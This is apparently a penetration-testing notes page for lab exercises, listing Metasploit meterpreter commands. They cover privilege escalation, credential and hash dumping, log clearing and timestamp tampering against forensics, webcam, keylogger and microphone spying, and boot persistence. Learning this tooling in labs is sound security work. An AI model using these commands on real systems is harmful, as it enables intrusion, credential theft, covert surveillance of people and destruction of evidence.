# Metasploit Framework

<div class="row row-cols-md-2"><div>

Although Metasploit has modules to scan (`search portscan`), brute force services... They won't be listed as other existing tools are more useful.

</div><div>
</div></div>

<hr class="sep-both">

##  ğŸï¸ Getting your meterpreter ğŸ

<div class="row row-cols-md-2"><div>

<details class="details-e">
<summary>You can use many Linux-like commands</summary>

```bash
meterpreter > ls # list files
meterpreter > cd # move
meterpreter > pwd # path to current folder
meterpreter > cat file # print file
meterpreter > edit file # open file in vim
meterpreter > ps # see running processes
meterpreter > exit
```
</details>

<details class="details-e">
<summary>Execute commands on your local machine</summary>

```bash
meterpreter > lpwd # or getlwd, local path
meterpreter > lcd path # move to local path
meterpreter > lls path # list local files
meterpreter > lcat file # print local file
```
</details>

Other useful commands

```bash
meterpreter > search -f pattern # search file by pattern
meterpreter > search -f pattern / # search inside /
meterpreter > download remote_path local_path # download
meterpreter > upload local_path remote_path # upload
```

</div><div>

* â¡ï¸ See if you are root and your privileges

```bash
meterpreter > getuid
# Windows: NT AUTHORITY\SYSTEM = admin ğŸ˜
```

* â¡ï¸ Learn more about the system. Here with Windows, you could look for CVEs given the build version. The architecture can help too, as some scripts are less useful on some architectures.

```bash
meterpreter > sysinfo
# Computer        : XXX-PC
# OS              : Windows X (... Build xxx...).
# Architecture    : x64
```

* â¡ï¸ Start a shell: `sh/bash` on Linux, `cmd` on Windows

```bash
meterpreter > shell # start a shell
C:\WINDOWS\system32> # Windows cmd
```

* â¡ï¸ Ask for suggested exploits

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

* â¡ï¸ Load a local file `commands.txt` with meterpreter commands

```bash
meterpreter > resource commands.txt
```

* â¡ï¸ ğŸ“ Migrate to another process ğŸ“. This is something as some services/stuff need us to be "in" a process that has the same architecture, and the same permissions, that our target. **Usually**, any process run by "NT AUTHORITY\SYSTEM"/root should be okay, although you may have to try a few times.

```bash
meterpreter > ps # list process
meterpreter > migrate process_pid # move to another process
meterpreter > migrate -N process_name # same
# most used ones
meterpreter > migrate -N spoolsv.exe # can restart so good
meterpreter > migrate -N explorer.exe # screenshots...
```
</div></div>

<hr class="sep-both">

## Notes for Windows meterpreter

[![blue](../../../_badges/thm-p/blue.svg)](https://tryhackme.com/room/blue)
[![ice](../../../_badges/thm-p/ice.svg)](https://tryhackme.com/room/ice)
[![blaster](../../../_badges/thm-p/blaster.svg)](https://tryhackme.com/room/blaster)
[![steelmountain](../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)

<div class="row row-cols-md-2 mt-3"><div>

* â¡ï¸ See your privileges

```bash
meterpreter > getprivs
```

* â¡ï¸ Try automatic privilege escalation ğŸ˜ ([more information](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)).

```bash
meterpreter > getsystem
```

* â¡ï¸ Load PowerShell

```bash
meterpreter > load powershell
meterpreter > powershell_shell
PS>
```
</div><div>

* â¡ï¸ Dump in-memory passwords

```bash
meterpreter > load kiwi
meterpreter > migrate some_process_nt_system_compatible
meterpreter > creds_all # retrieve all credentials
meterpreter > # you can also create a backdoor...
```

* â¡ | ï¸`root`. Dump every credential stored by the system. Passwords must be [cracked/dehashed](/_cybersecurity/random/crack_password/index.md#windows-password-cracking). You can use a [hash to login](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).

```bash
meterpreter > hashdump
# You may try to crack them using john within the msfconsole
msf6 exploit('module_used') > use auxiliary/analyze/crack_windows
msf6 exploit('module_used') > set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
msf6 exploit('module_used') > run
```
</div></div>

<hr class="sep-both">

## Notes for Linux meterpreter

<div class="row row-cols-md-2"><div>

You may use `upload`/`download`, but most of the time, you will be faster doing by running `shell` and doing things manually (without using Metasploit modules).
</div><div>

* â¡ | ï¸`root`. Dump every credential stored by the system. Passwords must be [cracked/dehashed](/_cybersecurity/random/crack_password/index.md#linux-shadow-hash-cracking). You can use a [hash to login](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).

```bash
# basically, all that to do, cat /etc/shadow
meterpreter > bg
msf6 exploit('module_used') > use post/linux/gather/hashdump
msf6 exploit('module_used') > set SESSION 1
msf6 exploit('module_used') > run
```
</div></div>

<hr class="sep-both">

## ğŸ¥³ Last step: have fun ğŸ¥³

<div class="row row-cols-md-2 mt-4"><div>

* â¡ï¸ | `root`. Clear logs

```bash
meterpreter > clearev
```

* â¡ï¸  | `root`. Mess with timestamp to complicate forensics

```bash
meterpreter > timestomp
```

* â¡ï¸ Random commands

```bash
meterpreter > idletime # time the host was idle
meterpreter > ipconfig # network information
meterpreter > localtime # time and date
# others
meterpreter > getenv
meterpreter > checksum
```
</div><div>

All the commands below require administrative/root privileges.

<details class="details-e">
<summary>Take control of the webcam</summary>

```bash
meterpreter > webcam_list
meterpreter > webcam_snap
```
</details>

<details class="details-e">
<summary>Take a screenshot</summary>

```bash
meterpreter > migrate -N explorer.exe
meterpreter > use espia
meterpreter > screengrab
```

You may also use `screenshot` ğŸ“Œ.
</details>

<details class="details-e">
<summary>Install a keylogger</summary>

```bash
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start # start
meterpreter > keyscan_dump # dump keys
```
</details>

<details class="details-e">
<summary>Watch the screen in real time</summary>

Watch the remote user desktop in real time

```bash
meterpreter > screenshare
meterpreter > record_mic # Record audio from the default microphone for X seconds
```
</details>

<details class="details-e">
<summary>Record microphone</summary>

Record audio from the default microphone for X seconds

```bash
meterpreter > record_mic
```
</details>

<details class="details-e">
<summary>Enable Remote Desktop Protocol</summary>

```bash
meterpreter > run post/windows/manage/enable_rdp
```
</details>

<details class="details-e">
<summary>Persistence</summary>

See [METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/).

```bash
# Automatically start the agent when the system boots
meterpreter > run persistence -X
```
</details>
</div></div>